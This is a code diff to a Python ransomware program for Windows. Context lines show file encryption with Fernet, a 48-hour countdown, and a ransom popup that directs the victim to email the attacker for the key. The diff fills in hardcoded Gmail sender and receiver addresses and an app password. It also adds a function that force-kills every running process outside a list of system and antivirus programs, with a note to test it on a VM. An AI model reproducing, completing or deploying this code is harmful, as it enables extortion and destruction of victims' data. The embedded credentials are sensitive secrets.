@@ -4,6 +4,7 @@ from cryptography.fernet import Fernet
 from email.message import EmailMessage
 from random import choices
 from string import ascii_letters, digits
+import psutil
 import smtplib
 import time
 import tkinter as tk
@@ -13,9 +14,9 @@ import winreg
 import base64
 import requests
 
-SENDER = ""
-SENDER_P = ""  # App password here,
-RECEIVER = ""
+SENDER = "sd@gmail.com"
+SENDER_P = "dassdaweirosdjkh"  # App password here,
+RECEIVER = "dff@gmail.com"
 timer = 60 * 60 * 48  # 48 hours
 
 
@@ -433,6 +434,29 @@ def popup_window(attack_id, key, email, attempts):
     root.mainloop()
 
 
+def shut_apps():
+    running_apps = {i.name() for i in psutil.process_iter()}
+
+    AVOID = {"Microsoft.Photos.exe", "GoogleCrashHandler.exe", "SearchIndexer.exe", "SDXHelper.exe", "audiodg.exe",
+             "sihost.exe", "dwm.exe", "wsc_proxy.exe", "aswEngSrv.exe", "wininit.exe", "aswidsagent.exe",
+             "taskhostw.exe", "AVGUI.exe", "RtkNGUI64.exe", "atkexComSvc.exe", "SystemSettingsBroker.exe",
+             "dasHost.exe", "lsass.exe", "WmiPrvSE.exe", "explorer.exe", "jusched.exe", "dllhost.exe", "atieclxx.exe",
+             "smss.exe", "svchost.exe", "spoolsv.exe", "SgrmBroker.exe", "SearchApp.exe", "igfxCUIService.exe",
+             "CompPkgSrv.exe", "SystemSettings.exe", "GoogleCrashHandler64.exe", "StartMenuExperienceHost.exe",
+             "gamingservicesnet.exe","GoogleUpdate.exe" "PhoneExperienceHost.exe", "sppsvc.exe", "XboxApp.exe",
+             "LockApp.exe", "NLSSRV32.EXE", "mongod.exe", "SppExtComObj.Exe", "fontdrvhost.exe", "RuntimeBroker.exe",
+             "SecurityHealthSystray.exe", "services.exe", "ShellExperienceHost.exe", "TextInputHost.exe", "csrss.exe",
+             "winlogon.exe", "SecurityHealthService.exe", "ctfmon.exe", "PresentationFontCache.exe", "warp-svc.exe",
+             "WUDFHost.exe", "armsvc.exe", "ApplicationFrameHost.exe", "conhost.exe", "atiesrxx.exe",
+             "AppVShNotify.exe"}
+
+    AVOID2 = {"System Idle Process", "System", "Registry", "MemCompression"}
+
+    for i in running_apps:
+        if i not in AVOID and i not in AVOID2:
+            os.system(f"taskkill /f /im {i}")
+
+
 def main():
     global timer
     # check if temp23.txt exists in C:\\temp as a firstrun check
@@ -489,9 +513,10 @@ def main():
                 f.write(str(attempt))
                 f.write("\n " + str(timer))
                 f.close()
-
             # Pop-up window with the attack ID and Email to send the key to the attacker
             popup_window(attack_id, decrypt_key, RECEIVER, attempt)
+
+            shut_apps()  # TODO: TEST IT OUT ON A VM (And then move it up maybe?)
 
 
 if __name__ == "__main__":
